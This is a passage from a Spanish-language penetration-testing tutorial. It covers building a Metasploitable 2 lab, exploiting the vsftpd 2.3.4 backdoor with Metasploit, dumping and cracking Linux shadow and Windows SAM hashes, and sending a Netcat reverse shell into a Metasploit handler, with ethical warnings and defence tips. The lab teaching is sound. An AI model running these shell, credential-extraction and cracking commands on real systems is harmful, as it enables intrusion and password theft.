1. Una **máquina host** (tu laptop o PC).
2. Un **hipervisor** (como **VirtualBox** o **VMware**).
3. Descargar la imagen de **Metasploitable** (generalmente en formato `.vmdk` o `.ova`).
4. Una red configurada para que tus máquinas se vean entre sí (como red interna o adaptador puente).

---

### ✅ Paso 1: Instalar VirtualBox

1. Ve a: [https://www.virtualbox.org/](https://www.virtualbox.org/)
2. Descarga para tu sistema operativo (Windows, macOS, Linux).
3. Instálalo como cualquier programa común.

📌 También puedes usar **VMware Workstation Player** si prefieres.

---

### ✅ Paso 2: Descargar Metasploitable 2

1. Ve al sitio oficial de Rapid7 (requiere registro gratuito):

   - [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

2. Descarga el archivo `.zip` o `.ova`.

---

### ✅ Paso 3: Importar Metasploitable en VirtualBox

#### Si descargaste un archivo `.ova`

1. Abre VirtualBox.
2. Menú: `Archivo` → `Importar servicio virtualizado`.
3. Selecciona el archivo `.ova` y haz clic en **Siguiente**.
4. Acepta la configuración por defecto o personaliza.
5. Clic en **Importar**.

#### Si descargaste `.vmdk` y `.vmx` (más manual)

1. Crea una nueva máquina en VirtualBox.
2. Tipo: `Linux`
   Versión: `Ubuntu (32-bit)`
3. Memoria: al menos 512 MB.
4. Disco duro: usa un disco duro existente (`.vmdk`) descargado.
5. Finaliza.

---

### ✅ Paso 4: Configurar red (muy importante)

Para comunicarte con Metasploitable desde Kali Linux u otra máquina virtual:

- En la configuración de **Red** de Metasploitable:

  - Modo: **Adaptador puente** (usa la red de tu PC).
  - O **Red interna** si todas tus máquinas están en VirtualBox.

Haz lo mismo con tu máquina atacante (como **Kali Linux**).

---

### ✅ Paso 5: Iniciar sesión en Metasploitable

Cuando la máquina arranca, verás una terminal. Las credenciales por defecto son:

- **Usuario:** `msfadmin`
- **Contraseña:** `msfadmin`

¡Listo! Ya puedes usar la máquina.

---

### 🧪 Ejemplo completo de laboratorio

#### 🎯 Objetivo: Usar Kali Linux para escanear Metasploitable con Nmap

##### 1. Verifica IPs

En Kali Linux:

```bash
ip a
```

En Metasploitable:

```bash
ifconfig
```

Supón que Metasploitable tiene la IP: `192.168.1.110`.

---

##### 2. Escanea con Nmap desde Kali

```bash
nmap -sS -sV -O 192.168.1.110
```

Esto detecta:

- Servicios y puertos abiertos.
- Sistemas operativos.
- Versiones de software vulnerables.

---

##### 3. Ver resultado típico

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

Cada uno de esos servicios tiene vulnerabilidades conocidas que puedes practicar con **Metasploit**.

---

### 💡 Tip adicional: Instala Kali Linux junto a Metasploitable

Puedes tener en VirtualBox dos máquinas:

- Kali Linux: atacante (herramientas de pentest).
- Metasploitable: objetivo (vulnerable).

Y practicar sin internet, en un entorno controlado.

---

### 🛑 Advertencia ética

> Usa Metasploitable **solo en entornos locales y controlados**. No lo conectes a internet. No lo uses para atacar redes externas. Está lleno de vulnerabilidades peligrosas.

---

### 📌 En resumen

| Elemento             | Descripción                                 |
| -------------------- | ------------------------------------------- |
| Hipervisor           | VirtualBox o VMware                         |
| Máquina vulnerable   | Metasploitable (descarga desde SourceForge) |
| Usuario / Contraseña | `msfadmin / msfadmin`                       |
| Red                  | Puente o Red Interna                        |
| Escaneo básico       | `nmap -sS -sV -O <IP>`                      |

---

[🔼](#índice)

---

## **956. Explotación de servicio FTP**

### 🧠 ¿Qué es FTP?

FTP (**File Transfer Protocol**) es un protocolo que permite **subir y descargar archivos** entre computadoras, típicamente un cliente y un servidor.

Por ejemplo:

- Subir archivos a un sitio web.
- Descargar actualizaciones de software.

---

### ⚠️ ¿Por qué es vulnerable?

FTP puede ser vulnerable por varias razones:

| Vulnerabilidad               | Explicación                                                |
| ---------------------------- | ---------------------------------------------------------- |
| Credenciales por defecto     | Usuario: `admin` / Clave: `admin`                          |
| FTP anónimo habilitado       | Permite conectarse sin usuario ni contraseña               |
| Software obsoleto con fallas | Ej: `vsftpd 2.3.4` tiene una **puerta trasera (backdoor)** |
| Transmisión en texto plano   | Contraseñas viajan sin cifrado                             |

---

### 🛠️ Herramientas que usaremos

- **Metasploitable 2** → máquina vulnerable con FTP inseguro (`vsftpd 2.3.4`)
- **Kali Linux** → máquina atacante
- **Nmap** → para escanear el servicio FTP
- **Metasploit** → para explotarlo

---

### 🧪 Laboratorio de explotación de FTP

#### 🔧 PASO 1: Verifica la IP de la máquina víctima

En **Metasploitable** (login: `msfadmin` / `msfadmin`):

```bash
ifconfig
```

Ejemplo de IP: `192.168.1.110`

---

#### 🔍 PASO 2: Escanear FTP con Nmap

En tu Kali Linux:

```bash
nmap -sV -p 21 192.168.1.110
```

Resultado esperado:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

🔎 ¡Esta versión es **vulnerable**!

---

#### ⚔️ PASO 3: Explotar con Metasploit

1. Abre Metasploit:

```bash
msfconsole
```

2. Busca el módulo adecuado:

```bash
search vsftpd
```

Verás:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

3. Cargar el módulo:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

4. Ver opciones:

```bash
show options
```

5. Establece el objetivo:

```bash
set RHOSTS 192.168.1.110
```

6. Ejecuta el exploit:

```bash
run
```

---

#### ✅ Resultado esperado

Si todo sale bien, obtendrás una **sesión de shell**:

```bash
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

¡Has obtenido **acceso root** a la máquina víctima!

---

### 🔐 ¿Cómo evitar esta vulnerabilidad en la vida real?

- No uses versiones antiguas de FTP.
- Usa **SFTP** en lugar de FTP.
- Deshabilita el acceso anónimo.
- Usa contraseñas fuertes.
- Aplica parches de seguridad.

---

### 🧩 ¿Y si el FTP permite acceso anónimo?

Puedes probarlo con:

```bash
ftp 192.168.1.110
```

Si no pide credenciales o acepta `anonymous`, puedes:

- Navegar los archivos.
- Descargar o subir archivos (si está mal configurado).
- Buscar archivos con credenciales (por ejemplo `.bash_history`, `.ssh/`, etc.).

---

### 📚 En resumen

| Elemento                 | Detalle                   |
| ------------------------ | ------------------------- |
| Servicio objetivo        | FTP (vsftpd 2.3.4)        |
| Herramientas usadas      | Nmap, Metasploit          |
| Vulnerabilidad explotada | backdoor en vsftpd        |
| Resultado                | Acceso remoto como `root` |

---

[🔼](#índice)

---

## **957. Extraer y descifrar contraseñas**

### 🧠 ¿Qué significa extraer y descifrar contraseñas?

**Extraer contraseñas**: Es obtener los hashes o claves almacenadas en algún sistema (por ejemplo, en un archivo de Windows o Linux).

**Descifrar contraseñas (cracking)**: Es aplicar técnicas para convertir esos hashes en contraseñas en texto plano. Esto se hace usando herramientas como:

- **John the Ripper**
- **Hashcat**

---

### ⚠️ ADVERTENCIA IMPORTANTE

> Esta información es solo con fines **educativos y legales**. Utilízala solo en entornos **controlados**, **laboratorios de práctica** o con **permiso explícito** del propietario del sistema. El uso indebido es **ilegal**.

---

### 🔧 Herramientas necesarias

- Kali Linux (ya tiene herramientas preinstaladas como John, Hashcat, etc.)
- Hashes extraídos de algún sistema (por ejemplo, `/etc/shadow` en Linux, o `SAM` en Windows)
- Diccionario de contraseñas (como `rockyou.txt`)

---

### 🔐 Ejemplo 1: Cracking de contraseñas en Linux

#### 🧪 Paso 1: Extraer contraseñas

En Linux, las contraseñas están en:

- `/etc/passwd` (usuarios)
- `/etc/shadow` (hashes de contraseñas)

Solo el usuario root puede leer `/etc/shadow`.

Ejemplo de línea del shadow:

```
juan:$6$X1a2b3c$nd8cGkY9...:18923:0:99999:7:::
```

Este `$6$` indica que el hash usa **SHA-512**.

---

#### 🧪 Paso 2: Crear un archivo con los hashes

Copia las líneas con hashes a un archivo llamado `hashes.txt`.

---

#### 🧪 Paso 3: Crackear con John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

> John intentará **comparar el hash** con cada palabra del diccionario hasta encontrar una coincidencia.

#### ✅ Ver resultados

```bash
john --show hashes.txt
```

---

### 🔐 Ejemplo 2: Extraer contraseñas de Windows

#### 🧪 Paso 1: Acceder al sistema

En Windows, los hashes están en:

- **SAM** file: `C:\Windows\System32\config\SAM`
- **SYSTEM** file: necesario para descifrar el SAM

Puedes extraerlos con:

##### 🔹 Herramienta: `secretsdump.py` (parte de Impacket)

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Salida:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Este es un **hash NTLM**.

---

#### 🧪 Paso 2: Crackear con Hashcat

Formato NTLM: tipo `1000` en Hashcat.

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

- `-m 1000` → Tipo NTLM
- `-a 0` → Ataque con diccionario

#### ✅ Ver resultados

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

---

### 🧠 Tipos de ataques para descifrar contraseñas

| Tipo           | Descripción                                           |
| -------------- | ----------------------------------------------------- |
| Diccionario    | Usa lista de palabras comunes                         |
| Fuerza bruta   | Prueba todas las combinaciones posibles               |
| Ataque híbrido | Diccionario + variaciones (mayúsculas, números, etc.) |
| Rainbow Tables | Tablas precalculadas de hashes                        |

---

### 💻 Instalación rápida de herramientas

#### 📦 John the Ripper

Ya viene instalado en Kali. Si no:

```bash
sudo apt install john
```

#### 📦 Hashcat

```bash
sudo apt install hashcat
```

---

### ✅ Ejemplo completo

#### 🔁 Caso práctico: Cracking de hash SHA-512 de Linux

1. Hash SHA-512:

```
$6$randomsalt$zGnZ3NC7FcBrZV90Ef9W19VP3X/3v6ddOk1Ub6qKc3KDc2LsjRi7gYiF1QuP0V65XwvwdrUjOeTgV2yNoLFfP0
```

2. Guardas el hash en `hashes.txt`.

3. Ejecutas John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

4. Ver resultado:

```bash
john --show hashes.txt
```

Resultado:

```
usuario:contraseña123
```

---

### 🛡️ ¿Cómo prevenir el cracking de contraseñas?

- Usar contraseñas largas y complejas
- Activar doble factor (2FA)
- Usar **bcrypt**, **scrypt** o **argon2** (algoritmos de hashing más seguros)
- Cambiar contraseñas regularmente
- Deshabilitar cuentas inactivas

---

### 📌 En resumen

| Elemento          | Ejemplo                              |
| ----------------- | ------------------------------------ |
| Herramientas      | John, Hashcat, secretsdump.py        |
| Hash extraído     | `$6$...` (SHA-512), `NTLM` (Windows) |
| Diccionario usado | `rockyou.txt`                        |
| Ataque            | Por diccionario                      |
| Resultado         | Contraseña en texto plano            |

---

[🔼](#índice)

---

## **958. Netcat a Metasploit Shell**

### 🧠 ¿Qué es Netcat?

**Netcat** es una herramienta de red que permite:

- Establecer conexiones TCP o UDP entre sistemas
- Enviar y recibir datos
- Crear servidores o clientes
- Establecer **reverse shells** o **bind shells**

---

### 🧠 ¿Qué es Metasploit?

**Metasploit Framework** es una plataforma que permite:

- Automatizar explotación de vulnerabilidades
- Crear cargas útiles (**payloads**)
- Obtener acceso remoto (shells, Meterpreter)
- Mantener persistencia y escalar privilegios

---

### 🎯 Objetivo

Vamos a:

1. Generar una **reverse shell** con Netcat desde un equipo víctima.
2. Usar **Metasploit** para capturar esa shell y convertirla en una sesión controlada.

---

### 🛠️ Requisitos

| Máquina                  | Rol      | Herramientas        |
| ------------------------ | -------- | ------------------- |
| Kali Linux               | Atacante | Netcat + Metasploit |
| Windows/Linux vulnerable | Víctima  | Netcat              |

> ⚠️ Puedes usar **Metasploitable 2 o 3** como víctima para pruebas legales y educativas.

---

### 📦 Instalación (si aún no tienes las herramientas)

#### 🐚 Netcat (ya viene en Kali, pero por si acaso)

```bash
sudo apt install netcat
```

#### 🦾 Metasploit

Kali ya lo tiene. Si no:

```bash
sudo apt update
sudo apt install metasploit-framework
```

Para iniciar:

```bash
msfconsole
```

---

### 📘 Conceptos clave

| Tipo de Shell     | ¿Quién inicia la conexión? | Puerto abierto en... |
| ----------------- | -------------------------- | -------------------- |
| **Reverse Shell** | La víctima                 | Atacante             |
| **Bind Shell**    | La víctima                 | Víctima              |

Usaremos una **reverse shell**, que es más común.

---

### ✅ Ejemplo completo: Reverse Shell con Netcat y Metasploit

---

#### 🔹 Paso 1: Preparar Metasploit para recibir la conexión

1. Abre una terminal en Kali y lanza Metasploit:

```bash
msfconsole
```

2. Usa el módulo `multi/handler`:

```bash
use exploit/multi/handler
```

3. Configura el **payload** para Netcat o una shell inversa:

```bash
set payload cmd/unix/reverse_netcat
```

O si usas un shell de Windows:

```bash
set payload windows/shell/reverse_tcp
```

4. Define la IP del atacante (tu Kali):

```bash
set LHOST <TU_IP_LOCAL>
```

5. Define el puerto que vas a escuchar:

```bash
set LPORT 4444
```

6. Inicia el listener:

```bash
exploit
```

---

#### 🔹 Paso 2: Ejecutar Netcat en la víctima

En la máquina víctima (puede ser una VM como Metasploitable), ejecutas:

```bash
nc <IP_ATACANTE> 4444 -e /bin/bash
```

Esto:

- Usa `nc` para conectarse al atacante
- El `-e /bin/bash` **envía una shell bash** al atacante

🔐 En Windows sería algo como:

```powershell
nc.exe <IP_ATACANTE> 4444 -e cmd.exe
```

---

#### 🔹 Paso 3: Ver la shell en Metasploit

Una vez que la víctima ejecuta el comando Netcat, verás en Metasploit:

```
[*] Started reverse TCP handler on <tu_ip>:4444
[*] Command shell session 1 opened
```

Ahora puedes escribir comandos directamente:

```bash
whoami
uname -a
ls
```

¡Ya tienes una shell remota desde Netcat conectada a Metasploit!

---

### 🧪 Alternativa: Usar `nc` directamente sin Metasploit

Puedes escuchar sin Metasploit así:

```bash
nc -lvnp 4444
```

Y esperar la conexión desde la víctima. Pero usando Metasploit puedes:

- Elevar privilegios
- Escalar ataques
- Usar módulos automáticos

---

### ⚠️ Importante

- No todos los Netcat tienen el parámetro `-e`. Algunos lo bloquean por seguridad.
- En sistemas modernos se usa `socat` o payloads más sofisticados.
- ¡Haz esto **solo en laboratorios controlados** o con autorización!

---

### 🧠 En resumen

| Elemento     | Valor                   |
| ------------ | ----------------------- |
| Herramientas | Netcat, Metasploit      |
| Tipo         | Reverse Shell           |
| Puerto       | 4444                    |
| Uso          | Acceso remoto con shell |

---

[🔼](#índice)

---

| **Inicio**         | **atrás 15**                                                  | **Siguiente 17**                         |
| ------------------ | ------------------------------------------------------------- | ---------------------------------------- |
| [🏠](../README.md) | [⏪](./7_15_Escaneo_Activo_y_Analisis_de_Vulnerabilidades.md) | [⏩](./7_17_Hacking_Servicios_de_Red.md) |
